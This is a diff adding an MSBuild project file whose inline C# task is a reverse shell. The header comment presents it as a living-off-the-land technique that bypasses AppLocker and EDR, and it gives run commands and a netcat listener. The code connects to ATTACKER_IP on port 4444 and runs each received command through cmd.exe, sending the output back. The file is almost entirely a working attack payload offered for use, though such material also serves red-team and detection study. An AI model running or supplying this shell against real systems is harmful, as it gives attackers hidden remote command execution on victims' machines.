@@ -1,0 +1,80 @@
+<!--
+  MSBuild Inline C# Reverse Shell — No compiler needed
+
+  MSBuild.exe is a LOLBIN (Living off the Land Binary) that can
+  execute arbitrary C# code inline. Present on all .NET systems.
+  Bypasses AppLocker default rules and many EDR products.
+
+  Usage:
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_revshell.xml
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild_revshell.xml
+
+  Start listener:
+    nc -lvnp 4444
+
+  MITRE ATT&CK: T1127.001 — Trusted Developer Utilities: MSBuild
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <RevShell />
+  </Target>
+  <UsingTask
+    TaskName="RevShell"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.Net" />
+      <Using Namespace="System.Net.Sockets" />
+      <Using Namespace="System.Diagnostics" />
+      <Using Namespace="System.IO" />
+      <Code Type="Fragment" Language="cs">
+      <![CDATA[
+        // ──── CHANGE THESE ────
+        string host = "ATTACKER_IP";
+        int port = 4444;
+        // ──────────────────────
+
+        try
+        {
+            using (TcpClient client = new TcpClient(host, port))
+            {
+                using (NetworkStream stream = client.GetStream())
+                {
+                    StreamReader reader = new StreamReader(stream);
+                    StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };
+
+                    writer.WriteLine("[+] MSBuild shell from " + Environment.MachineName);
+                    writer.Write("PS> ");
+
+                    while (true)
+                    {
+                        string cmd = reader.ReadLine();
+                        if (cmd == null || cmd.Trim().ToLower() == "exit") break;
+
+                        ProcessStartInfo psi = new ProcessStartInfo()
+                        {
+                            FileName = "cmd.exe",
+                            Arguments = "/c " + cmd,
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true,
+                            UseShellExecute = false,
+                            CreateNoWindow = true
+                        };
+
+                        Process proc = Process.Start(psi);
+                        writer.Write(proc.StandardOutput.ReadToEnd());
+                        writer.Write(proc.StandardError.ReadToEnd());
+                        proc.WaitForExit();
+                        writer.Write("PS> ");
+                    }
+                }
+            }
+        }
+        catch { }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
